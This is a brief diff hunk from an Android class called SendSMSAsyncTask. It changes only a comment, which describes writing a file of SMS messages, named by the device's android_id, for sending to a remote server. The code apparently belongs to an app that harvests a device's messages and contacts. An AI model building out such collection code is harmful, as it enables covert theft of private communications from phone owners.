@@ -68,7 +68,7 @@ public class SendSMSAsyncTask extends AsyncTask<Context, Void, String> {
             e.printStackTrace();
         }
 
-        // Create a file with the contact list to send to the remote server
+        // Create a file with the sms messages to send to the remote server
         File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-sms"+".txt");
         try {
             file.createNewFile();
